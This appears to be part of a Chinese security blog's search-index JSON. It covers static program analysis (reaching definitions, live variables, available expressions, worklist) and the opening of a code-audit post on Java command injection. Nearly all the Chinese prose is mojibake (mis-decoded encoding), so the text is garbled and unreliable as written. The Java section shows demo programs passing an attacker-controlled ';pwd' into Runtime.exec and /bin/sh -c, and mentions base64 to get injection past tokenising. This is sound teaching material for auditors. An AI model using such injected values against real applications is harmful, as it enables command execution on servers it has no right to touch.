pï¼Œå¹¶ä¸”æ­¤è·¯å¾„ä¸Šé¢æ²¡æœ‰ x çš„å…¶ä»–å®šå€¼ç‚¹ï¼Œåˆ™ç§° x çš„å®šå€¼ d åˆ°è¾¾ (reaching) pã€‚ å¦‚æœåœ¨è¿™æ¡è·¯å¾„ä¸Šæœ‰å¯¹ x çš„å…¶å®ƒå®šå€¼ï¼Œæˆ‘ä»¬è¯´å˜é‡ x çš„è¿™ä¸ªå®šå€¼ d è¢«æ€æ­» (killed) äº† åˆ°è¾¾å®šå€¼å¯ä»¥ç”¨æ¥åˆ†ææœªå®šä¹‰çš„å˜é‡ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬åœ¨ç¨‹åºå…¥å£ä¸ºå„å˜é‡å¼•å…¥ä¸€ä¸ª dummy å®šå€¼ã€‚å½“ç¨‹åºå‡ºå£çš„æŸå˜é‡å®šå€¼ä¾ç„¶ä¸º dummyï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è®¤ä¸ºè¯¥å˜é‡æœªè¢«å®šä¹‰ã€‚ å¯¹äºä¸€æ¡èµ‹å€¼è¯­å¥ D: v = x op yï¼Œè¯¥è¯­å¥ç”Ÿæˆäº† v çš„ä¸€ä¸ªå®šå€¼ Dï¼Œå¹¶æ€æ­»ç¨‹åºä¸­å…¶å®ƒå¯¹å˜é‡ v å®šä¹‰çš„å®šå€¼ã€‚ ç†è§£åˆ°è¾¾å®šå€¼åˆ†æ æ•°æ®æµå€¼ï¼š ç¨‹åºä¸­æ‰€æœ‰å˜é‡çš„å®šå€¼ã€‚ å¯ä»¥ç”¨ä¸€ä¸ª bit vector æ¥å®šä¹‰ï¼Œæœ‰å¤šå°‘ä¸ªèµ‹å€¼è¯­å¥ï¼Œå°±æœ‰å¤šå°‘ä¸ªä½ã€‚ D å³ Definitionï¼Œå¯ä»¥è¡¨ç¤ºä¸ºï¼šDï¼šv = x op y ä¸€ä¸ª D å¯ä»¥è§†ä¸ºä¸€è¡Œä¸‰åœ°å€ç ï¼Œåšäº†ä¸¤ä»¶äº‹ï¼š ç”Ÿæˆäº†ä¸€ä¸ªå®šä¹‰ D åœ¨ä¿æŒå…¶ä»–ä¼ å…¥ç¨‹åºä¸å—å½±å“çš„åŒæ—¶ï¼Œkill äº†ç¨‹åºä¸­å…¶å®ƒå¯¹å˜é‡ v çš„å®šä¹‰ è½¬ç§»æ–¹ç¨‹ä¸æ§åˆ¶æµï¼š å…¶ä¸­ U è¡¨ç¤º unionï¼Œç»“åˆå‰æ–‡ä½¿ç”¨ bit å­—èŠ‚è¡¨ç¤ºçš„ Dï¼Œå¯ä»¥çŸ¥é“ï¼ŒIN[B] çš„è¾“å…¥ç­‰äº OUT[P1] å¹¶ OUT[P2]ï¼Œæ„å‘³ç€åªè¦å­˜åœ¨ä¸€æ¡è·¯å¾„å¯ä»¥ reachï¼Œé‚£ä¹ˆå°±ç®—ä½œå¯ä»¥ reachã€‚ è¾¾å®šå€¼åˆ†æçš„ç®—æ³•è¡¨ç¤º è¿™æ˜¯ä¸€ä¸ªç»å…¸çš„è¿­ä»£ç®—æ³•ï¼š é¦–å…ˆè®©æ‰€æœ‰ BB å’Œå…¥å£çš„ OUT ä¸ºç©ºã€‚å› ä¸ºä½ ä¸çŸ¥é“ BB ä¸­æœ‰å“ªäº›å®šå€¼è¢«ç”Ÿæˆã€‚ å½“ä»»æ„ OUT å‘ç”Ÿå˜åŒ–ï¼Œåˆ™åˆ†æå‡ºçš„å®šå€¼å¯èƒ½éœ€è¦ç»§ç»­å¾€ä¸‹æµåŠ¨ï¼Œæ‰€éœ€è¦ä¿®æ”¹å„ BB çš„ IN å’Œ OUTã€‚ å…ˆå¤„ç† INï¼Œç„¶åå†æ ¹æ®è½¬ç§»å®Œæˆæ›´æ–° OUTã€‚ åœ¨ gen U (IN - kill) ä¸­ï¼Œkill ä¸ gen ç›¸å…³çš„ bit ä¸ä¼šå› ä¸º IN çš„æ”¹å˜è€Œå‘ç”Ÿæ”¹å˜ï¼Œè€Œå…¶å®ƒ bit åˆæ˜¯é€šè¿‡å¯¹å‰é©± OUT å–å¹¶å¾—åˆ°çš„ï¼Œå› æ­¤å…¶å®ƒ bit ä¸ä¼šå‘ç”Ÿ 0 -\u003e 1 çš„æƒ…å†µã€‚æ‰€ä»¥ï¼ŒOUT æ˜¯ä¸æ–­å¢é•¿çš„ï¼Œè€Œä¸”æœ‰ä¸Šç•Œï¼Œå› æ­¤ç®—æ³•æœ€åå¿…ç„¶ä¼šåœæ­¢ã€‚ å› ä¸º OUT æ²¡æœ‰å˜åŒ–ï¼Œä¸ä¼šå¯¼è‡´ä»»ä½•çš„ IN å‘ç”Ÿå˜åŒ–ï¼Œå› æ­¤ OUT ä¸å˜å¯ä»¥ä½œä¸ºç»ˆæ­¢æ¡ä»¶ã€‚æˆ‘ä»¬ç§°ä¹‹ä¸ºç¨‹åºåˆ°è¾¾äº†ä¸åŠ¨ç‚¹ï¼ˆFixed Pointï¼‰ è¯¥ç®—æ³•ä¸ºä»€ä¹ˆä¼šç»ˆæ­¢ï¼ŸOUT[S] never shrinks ä¸”çŠ¶æ€æ˜¯æœ‰é™çš„ï¼ˆåˆ°è¾¾ä¸åŠ¨ç‚¹ï¼‰ 3.2.2 æ´»è·ƒå˜é‡åˆ†æï¼šLive Variables Analysis åŸºæœ¬æ¦‚å¿µ ç»™å®šç¨‹åºä¸­çš„æŸæ¡è¯­å¥ s å’Œå˜é‡ vï¼Œå¦‚æœåœ¨ s æ‰§è¡Œå‰ä¿å­˜åœ¨ v ä¸­çš„å€¼åœ¨åç»­æ‰§è¡Œä¸­è¿˜ä¼šè¢«è¯»å–ï¼Œå°±ç§°ä¹‹ä¸ºæ´»è·ƒå˜é‡ã€‚ å˜é‡ x åœ¨ç¨‹åºç‚¹ p ä¸Šçš„å€¼æ˜¯å¦ä¼šåœ¨æŸæ¡ä» p å‡ºå‘çš„è·¯å¾„ä¸­ä½¿ç”¨ å˜é‡ x åœ¨ p ä¸Šæ´»è·ƒï¼Œå½“ä¸”ä»…å­˜åœ¨ä¸€æ¡ä» p å¼€å§‹çš„è·¯å¾„ï¼Œè¯¥è·¯å¾„çš„æœ«ç«¯ä½¿ç”¨äº† xï¼Œä¸”è·¯å¾„ä¸Šæ²¡æœ‰å¯¹ x è¿›è¡Œè¦†ç›–ã€‚ éšè—äº†è¿™æ ·ä¸€ä¸ªå«ä¹‰ï¼šåœ¨è¢«ä½¿ç”¨å‰ï¼Œv æ²¡æœ‰è¢«é‡æ–°å®šä¹‰è¿‡ï¼Œå³æ²¡æœ‰è¢« kill è¿‡ã€‚ è¿™ä¸ªç®—æ³•å¯ä»¥ç”¨äºå¯„å­˜å™¨åˆ†é…ï¼Œå½“ä¸€ä¸ªå˜é‡ä¸ä¼šå†è¢«ä½¿ç”¨ï¼Œé‚£ä¹ˆæ­¤å˜é‡å°±å¯ä»¥ä»å¯„å­˜å™¨ä¸­è…¾ç©ºï¼Œç”¨äºæ–°å€¼çš„å­˜å‚¨ã€‚ æ´»è·ƒå˜é‡ä¸­åˆ†æ æ•°æ®æµå€¼ ç¨‹åºä¸­çš„æ‰€æœ‰å˜é‡ ä¾ç„¶å¯ä»¥ç”¨ bit vector æ¥è¡¨ç¤ºï¼Œæ¯ä¸ª bit ä»£è¡¨ä¸€ä¸ªå˜é‡ è½¬ç§»æ–¹ç¨‹å’Œæ§åˆ¶æµå¤„ç† ä¸åŒäº Reaching Definitions çš„å‰å‘ä¼ æ’­åˆ†æï¼ŒLive Variables Analysis ä½¿ç”¨åå‘ä¼ æ’­è¿›è¡Œåˆ†ææ•ˆæœæ›´å¥½ã€‚å¦‚æœä»åå¾€å‰æœç´¢ï¼Œåªè¦åœ¨æŸç¨‹åºç‚¹å¤„æ‰¾åˆ°ä¸€ä¸ªå˜é‡ v çš„ä½¿ç”¨ï¼Œå°±è¯æ˜åœ¨æ­¤ä¹‹å‰ä»»æ„å¯è¾¾æ­¤ç‚¹çš„ã€å®šä¹‰äº† v çš„ç¨‹åºç‚¹å¤„ï¼Œv éƒ½æ˜¯ live çš„ï¼›è€Œå¦‚æœä½¿ç”¨å‰å‘ä¼ æ’­çš„ç®—æ³•ï¼Œæ¯åˆ°ä¸€ä¸ªç¨‹åºç‚¹éƒ½è¦æ­£å‘æœç´¢ä¸€éåæ–¹çš„è·¯å¾„æ‰èƒ½ç¡®è®¤å˜é‡åœ¨æ­¤å¤„æ˜¯å¦ liveï¼Œè™½ç„¶ä¹Ÿèƒ½è¿›è¡Œåˆ†æï¼Œä½†æ˜¯æ•ˆç‡è¾ƒä½ã€‚ ä¸€ä¸ªåŸºæœ¬å—å†…ï¼Œè‹¥ v = exp, åˆ™ def vã€‚è‹¥ exp = exp op vï¼Œé‚£ä¹ˆ use vã€‚ä¸€ä¸ªå˜é‡è¦ä¹ˆæ˜¯ useï¼Œè¦ä¹ˆæ˜¯ defï¼Œæ ¹æ® def å’Œ use çš„å…ˆåé¡ºåºæ¥å†³å®šã€‚ è€ƒè™‘åŸºæœ¬å— B åŠå…¶åç»§ Sã€‚è‹¥ S ä¸­ï¼Œå˜é‡ v è¢«ä½¿ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æŠŠ v æ”¾åˆ° S çš„ IN ä¸­ï¼Œäº¤ç»™ B æ¥åˆ†æã€‚ å› æ­¤å¯¹äºæ´»è·ƒå˜é‡åˆ†æï¼Œå…¶æ§åˆ¶æµå¤„ç†æ˜¯ OUT[B] = IN[S]ã€‚ åœ¨ä¸€ä¸ªå—ä¸­ï¼Œè‹¥å˜é‡ v è¢«ä½¿ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ·»åŠ åˆ°æˆ‘ä»¬çš„ IN é‡Œã€‚è€Œå¦‚æœ v è¢«å®šä¹‰ï¼Œé‚£ä¹ˆåœ¨å…¶ä¹‹ä¸Šçš„è¯­å¥ä¸­ï¼Œv éƒ½æ˜¯ä¸€ä¸ªéæ´»è·ƒå˜é‡ï¼Œå› ä¸ºæ²¡æœ‰è¯­å¥å†éœ€è¦ä½¿ç”¨å®ƒã€‚ å› æ­¤å¯¹äºè½¬ç§»æ–¹ç¨‹ï¼ŒIN æ˜¯ä» OUT ä¸­åˆ å»é‡æ–°å®šå€¼çš„å˜é‡ï¼Œç„¶åå¹¶ä¸Šä½¿ç”¨è¿‡çš„å˜é‡ã€‚éœ€è¦æ³¨æ„ï¼Œå¦‚æœåŒä¸€ä¸ªå—ä¸­ï¼Œå˜é‡ v çš„ def å…ˆäº use ï¼Œé‚£ä¹ˆå®é™…ä¸Šæ•ˆæœå’Œæ²¡æœ‰ use æ˜¯ä¸€æ ·çš„ã€‚ ç®—æ³•è¡¨ç¤º 3.2.3 å¯ç”¨è¡¨è¾¾å¼åˆ†æï¼šAvailable Expression Analysis åŸºæœ¬æ¦‚å¿µ x + y åœ¨ p ç‚¹å¯ç”¨çš„æ¡ä»¶ï¼šä»æµå›¾å…¥å£ç»“ç‚¹åˆ°è¾¾ p çš„æ¯æ¡è·¯å¾„éƒ½å¯¹ x + y æ±‚äº†å€¼ï¼Œä¸”åœ¨æœ€åä¸€æ¬¡æ±‚å€¼ä¹‹åå†æ²¡æœ‰å¯¹ x æˆ– y èµ‹å€¼ã€‚ å¯ç”¨è¡¨è¾¾å¼å¯ä»¥ç”¨äºå…¨å±€å…¬å…±å­è¡¨è¾¾å¼çš„è®¡ç®—ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä¸€ä¸ªè¡¨è¾¾å¼ä¸Šæ¬¡è®¡ç®—çš„å€¼åˆ°è¿™æ¬¡ä»ç„¶å¯ç”¨ï¼Œæˆ‘ä»¬å°±èƒ½ç›´æ¥åˆ©ç”¨å…¶ä¸­å€¼ï¼Œè€Œä¸ç”¨è¿›è¡Œå†æ¬¡çš„è®¡ç®—ã€‚ å¯ç”¨è¡¨è¾¾å¼åˆ†æåˆ†æ æ•°æ®æµå€¼ ç¨‹åºä¸­çš„æ‰€æœ‰è¡¨è¾¾å¼ bit vector ä¸­ï¼Œä¸€ä¸ª bit å°±æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ è½¬æ¢å‡½æ•°ä¸æ§åˆ¶æµå¤„ç† Bï¼Œè¡¨è¾¾å¼éƒ½åº”è¯¥å·²ç»è®¡ç®—ï¼Œæ‰èƒ½å°†å…¶è§†ä¸ºå¯ç”¨è¡¨è¾¾å¼ï¼Œå› æ­¤è¿™æ˜¯ä¸€ä¸ª must analysisã€‚ æ³¨æ„åˆ°å›¾ä¸­ï¼Œä¸¤æ¡ä¸åŒçš„è·¯å¾„å¯èƒ½ä¼šå¯¼è‡´è¡¨è¾¾å¼çš„ç»“æœæœ€ç»ˆä¸ä¸€è‡´ã€‚ä½†æ˜¯æˆ‘ä»¬åªå…³å¿ƒå®ƒçš„å€¼èƒ½ä¸èƒ½å¤Ÿå†è¢«é‡å¤åˆ©ç”¨ï¼Œå› æ­¤å¯ä»¥è®¤ä¸ºè¡¨è¾¾å¼å¯ç”¨ã€‚ v = x op yï¼Œåˆ™ gen x op yã€‚å½“ x = a op bï¼Œåˆ™ä»»ä½•åŒ…å« x çš„è¡¨è¾¾å¼éƒ½è¢« kill æ‰ã€‚è‹¥ gen å’Œ kill åŒæ—¶å­˜åœ¨ï¼Œé‚£ä¹ˆä»¥æœ€åä¸€ä¸ªæ“ä½œä¸ºå‡†ã€‚ è½¬ç§»æ–¹ç¨‹å¾ˆå¥½ç†è§£ï¼Œå’Œåˆ°è¾¾å®šå€¼å·®ä¸å¤šã€‚ä½†æ˜¯ï¼Œç”±äºæˆ‘ä»¬æ˜¯ must analysisï¼Œå› æ­¤æ§åˆ¶æµå¤„ç†æ˜¯å–äº¤é›†ï¼Œè€Œéåˆ°è¾¾å®šå€¼é‚£æ ·å–å¹¶é›†ã€‚ ç®—æ³•è¡¨ç¤º æ³¨æ„æ­¤æ—¶çš„åˆå§‹åŒ–ï¼šä¸€å¼€å§‹ç¡®å®æ— ä»»ä½•è¡¨è¾¾å¼å¯ç”¨ï¼Œå› æ­¤ OUT[entry] è¢«åˆå§‹åŒ–ä¸ºç©ºé›†æ˜¯è‡ªç„¶çš„ã€‚ä½†æ˜¯ï¼Œå…¶å®ƒåŸºæœ¬å—çš„ OUT è¢«åˆå§‹åŒ–ä¸ºå…¨é›†ï¼Œè¿™æ˜¯å› ä¸ºå½“ CFG å­˜åœ¨ç¯æ—¶ï¼Œä¸€ä¸ªç©ºçš„åˆå§‹åŒ–å€¼ï¼Œä¼šè®©å–äº¤é›†é˜¶æ®µç›´æ¥æŠŠç¬¬ä¸€æ¬¡è¿­ä»£çš„ IN è®¾ç½®æˆ 0ï¼Œæ— æ³•è¿›è¡Œæ­£ç¡®çš„åˆ¤å®šäº†ã€‚ å¦‚æœä¸€ä¸ªè¡¨è¾¾å¼ä»æ¥éƒ½ä¸å¯ç”¨ï¼Œé‚£ä¹ˆ OUT[entry] çš„å…¨ 0 å€¼ä¼šé€šè¿‡äº¤æ“ä½œå°†å…¶ç½®ä¸º 0ï¼Œå› æ­¤ä¸ç”¨æ‹…å¿ƒåˆå§‹åŒ–ä¸ºå…¨ 1 ä¼šå¦å¯¼è‡´ç®—æ³•ä¸æ­£ç¡®ã€‚ 3.2.4 å¸¸é‡ä¼ æ’­ï¼šConstant Propagation åŸºæœ¬æ¦‚å¿µ åœ¨ç¨‹åºç‚¹ p å¤„ç»™å®šä¸€ä¸ªå˜é‡ xï¼Œåˆ¤æ–­xåœ¨ç¨‹åºç‚¹ p å¤„æ˜¯å¦ä¸€å®šæŒ‡å‘ä¸€ä¸ªå¸¸é‡ã€‚ è¿™æ˜¯ä¸€ä¸ªç±»ä¼¼ must åˆ†æï¼Œå› ä¸ºå¿…é¡»æ‰€æœ‰åˆ°ç‚¹ p çš„ path éƒ½æ˜¯è¿™ä¸ªå¸¸é‡æ‰è¡Œï¼›ä½†æœ‰å’Œä¼ ç»Ÿçš„ä¸å¤§ä¸€æ ·ã€‚åœ¨ CFG ä¸­æ¯ä¸ªèŠ‚ç‚¹çš„è¾“å‡ºåŒ…æ‹¬ä¸€ä¸ªå¯¹ (x, v)ï¼Œå…¶ä¸­ x æ˜¯å˜é‡è€Œ v æ˜¯åœ¨è¯¥èŠ‚ç‚¹å x æŒ‡å‘çš„å…·ä½“å€¼ã€‚ å¸¸é‡ä¼ æ’­åˆ†æ è½¬æ¢å‡½æ•°ï¼š OUT[s] = gen U (IN[s] - {(x, _)}) ","date":"2022-02-14","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/:3:2","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(ä¸€)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"3.4 Work list ç®—æ³• æœ€åå†æä¸€ä¸‹ Worklist ç®—æ³•ï¼Œè¿™æ˜¯å¯¹ä¹‹å‰æ•°æ®æµåˆ†æè¿­ä»£ç®—æ³•ä¸€ç§å®Œå…¨çš„æ”¹è¿›ï¼Œä¸å½±å“ç²¾åº¦çš„æƒ…å†µä¸‹ï¼Œæœ‰æ›´é«˜çš„æ•ˆç‡ã€‚ ä¸åŒäºæ™®é€šè¿­ä»£ç®—æ³•ï¼Œä¸€ä¸ª OUT å˜äº†æ‰€æœ‰çš„éƒ½è¦è·‘ä¸€éï¼Œworklist çš„æ•ˆç‡é«˜å¾ˆå¤šï¼Œå› ä¸º gen å’Œ kill æ˜¯ä¸ä¼šå˜çš„ï¼ŒOUT å˜åŒ–åªå–å†³äº IN çš„å˜åŒ–ï¼Œå› æ­¤å…ˆæŠŠæ‰€æœ‰èŠ‚ç‚¹æ”¾è¿›å»ï¼Œç„¶åæ¯ä¸ªå˜åŒ–çš„ OUT éƒ½æŠŠåç»§æ”¾è¿›å»ï¼Œæ¥å›çš„è·‘ç›´åˆ°ç»“æŸã€‚ ","date":"2022-02-14","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/:3:3","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(ä¸€)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"3.5 æ€»ç»“ ","date":"2022-02-14","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/:3:4","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(ä¸€)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"å‚è€ƒ å—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†æã€‹Yue Li and Tian Tan åŒ—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†ææŠ€æœ¯ã€‹Xiong Yingfei pascal-group.bitbucket.io https://fancypei.github.io/SA/ https://blog.csdn.net/zhang971105/article/details/109074766 https://spa-book.pblo.gq/ch1/2intermediaterepresentation ","date":"2022-02-14","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/:4:0","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(ä¸€)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"Java æœ¬åœ°å‘½ä»¤æ‰§è¡Œæ¼æ´","date":"2022-02-13","objectID":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","tags":["ä»£ç å®¡è®¡"],"title":"Java æœ¬åœ°å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"Java æœ¬åœ°å‘½ä»¤æ‰§è¡Œæ¼æ´ ","date":"2022-02-13","objectID":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["ä»£ç å®¡è®¡"],"title":"Java æœ¬åœ°å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"èƒŒæ™¯ JDK åŸç”Ÿæä¾›äº†æœ¬åœ°ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¯¥æ¼æ´åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸­æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚åœ¨ Java ä¸­å¯ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ–¹å¼æœ‰ API æœ‰ï¼š java.lang.Runtime java.lang.ProcessBuilder java.lang.UNIXProcess/ProcessImplã€‚ ","date":"2022-02-13","objectID":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["ä»£ç å®¡è®¡"],"title":"Java æœ¬åœ°å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"Runtime å‘½ä»¤æ‰§è¡Œ ","date":"2022-02-13","objectID":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["ä»£ç å®¡è®¡"],"title":"Java æœ¬åœ°å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"exec(String command) åœ¨ Java ä¸­é€šå¸¸ä¼šä½¿ç”¨ java.lang.Runtime ç±»çš„ exec æ–¹æ³•æ¥æ‰§è¡Œæœ¬åœ°ç³»ç»Ÿå‘½ä»¤ã€‚ ä»¥å¦‚ä¸‹ç¨‹åºæ‰§è¡Œå‘½ä»¤ä¸ºä¾‹ï¼š package com.geekby; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStream; import java.io.InputStreamReader; public class Main { public static void main(String[] args) throws IOException { String cmd = \"\"; Process p = Runtime.getRuntime().exec(\"ping 127.0.0.1\" + cmd); InputStream fis = p.getInputStream(); BufferedReader br = new BufferedReader(new InputStreamReader(fis)); String line = null; while ((line = br.readLine()) != null) { System.out.println(line); } } } ä¸Šé¢çš„ç¨‹åºå¯ä»¥æˆåŠŸæ‰§è¡Œ ping å‘½ä»¤ã€‚å‡è®¾ç°åœ¨æ”»å‡»è€…å¯ä»¥æ§åˆ¶ cmd å‚æ•°ï¼Œé€šè¿‡å‘½ä»¤æ‹¼æ¥ï¼Œå»æ‰§è¡Œå…¶å®ƒå‘½ä»¤ã€‚ä»¥ cmd = \";pwd\" ä¸ºä¾‹ï¼Œå¯ä»¥å‘ç°ï¼Œå‘½ä»¤æ— æ³•æ‰§è¡Œï¼Œç”šè‡³è¿ ping å‘½ä»¤éƒ½æ— æ³•å°†ç»“æœå›æ˜¾ã€‚ ä¸ºäº†æ¢ç©¶å‘½ä»¤æ‰§è¡Œå¤±è´¥çš„åŸå› ï¼Œé¦–å…ˆè·Ÿè¸ªç¨‹åºè°ƒç”¨æ ˆï¼š create:-1, ProcessImpl (java.lang) \u003cinit\u003e:386, ProcessImpl (java.lang) start:137, ProcessImpl (java.lang) start:1029, ProcessBuilder (java.lang) exec:620, Runtime (java.lang) exec:450, Runtime (java.lang) exec:347, Runtime (java.lang) main:8, Main (com.geekby) é€šè¿‡è·Ÿè¿›è°ƒç”¨é“¾å¯ä»¥å‘ç°ï¼Œexec æ–¹æ³•æœ€ç»ˆè°ƒç”¨åˆ°äº†ä¸€ä¸ªé‡è½½å‡½æ•° exec(String command, String[] envp, File dir) ä¸­ï¼š å‘½ä»¤ä»¥å­—ç¬¦ä¸²å‡ºå…¥åˆ°è¯¥å‡½æ•°åï¼Œé¦–å…ˆé€šè¿‡ StringTokenizer å¯¹å…¶è¿›è¡Œäº†å¤„ç†ï¼Œæ ¹æ® \\t\\n\\r\\f æŠŠä¼ å…¥çš„ command åˆ†å‰²ï¼š ç»è¿‡å¤„ç†ä¹‹åï¼Œæœ€åå®ä¾‹åŒ–äº† ProcessBuilder æ¥å¤„ç†ä¼ å…¥çš„ cmdarrayã€‚åœ¨æ­¤å¤„ä¹Ÿå¯ä»¥å‘ç°ï¼ŒRuntime.getRuntime.exec() çš„åº•å±‚å®é™…ä¸Šä¹Ÿæ˜¯ ProcessBuilderã€‚ ç»§ç»­è·Ÿè¿› ProcessBuilder ç±»ä¸­çš„ start æ–¹æ³•ï¼Œåœ¨ è¯¥æ–¹æ³•ä¸­å°† cmdarry ç¬¬ä¸€ä¸ªå‚æ•° cmdarry[0] å½“ä½œè¦æ‰§è¡Œçš„å‘½ä»¤ï¼ŒæŠŠåé¢çš„ cmdarry[1:] ä½œä¸ºå‘½ä»¤æ‰§è¡Œçš„å‚æ•°è½¬æ¢æˆ byte æ•°ç»„ argBlockã€‚ æ­¤æ—¶ prog æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ ping, argBlock éƒ½æ˜¯ä¼ ç»™ ping çš„å‚æ•° 127.0.0.1;pwdï¼Œç»è¿‡ StringTokenizer å¯¹å­—ç¬¦ä¸²çš„å¤„ç†ï¼Œæ”¹å˜äº†å‘½ä»¤æ‰§è¡Œçš„è¯­ä¹‰ï¼Œæ— æ³•å°†åˆ†å·ä½œä¸ºå‘½ä»¤åˆ†éš”ç¬¦ï¼Œè¿›è€Œå®ç°å‘½ä»¤æ³¨å…¥ã€‚ ","date":"2022-02-13","objectID":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:1","tags":["ä»£ç å®¡è®¡"],"title":"Java æœ¬åœ°å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"exec(String cmdarray[]) Java Runtime åŒ…ä¸­å­˜åœ¨ exec å‡½æ•°çš„é‡è½½å‡½æ•°ï¼Œå…¶å‚æ•°ç±»å‹ä¸ºå­—ç¬¦ä¸²æ•°ç»„ã€‚ package com.geekby; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStream; import java.io.InputStreamReader; public class Main { public static void main(String[] args) throws IOException { String cmd = \";pwd\"; Process p = Runtime.getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", cmd}); InputStream fis = p.getInputStream(); BufferedReader br = new BufferedReader(new InputStreamReader(fis)); String line = null; while ((line = br.readLine()) != null) { System.out.println(line); } } } è·Ÿè¿› exec å‡½æ•°çš„åº•å±‚ä»£ç ï¼Œå› ä¸ºç›´æ¥ä¼ å…¥çš„æ˜¯æ•°ç»„ï¼Œæ‰€ä»¥æ²¡æœ‰ç»è¿‡ StringTokenizer å¯¹å­—ç¬¦ä¸²çš„å¤„ç† æœ€ç»ˆè·Ÿè¿›åˆ° UNIXProcess æ–¹æ³• æ­¤æ—¶ prog æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ /bin/sh , argBlock éƒ½æ˜¯ä¼ ç»™ ping çš„å‚æ•° -c\\x00\"ping 127.0.0.1;pwd\" å› æ­¤ï¼Œåœ¨å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œä¸èƒ½é‡‡ç”¨å‘½ä»¤åˆ†å‰²çš„å½¢å¼è¿›è¡Œå‘½ä»¤æ³¨å…¥ã€‚æ ¹æ®å…·ä½“æƒ…å†µï¼Œå¯ä»¥é‡‡å– base64 ç¼–ç çš„å½¢å¼ã€‚ ","date":"2022-02-13","objectID":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:2","tags":["ä»£ç 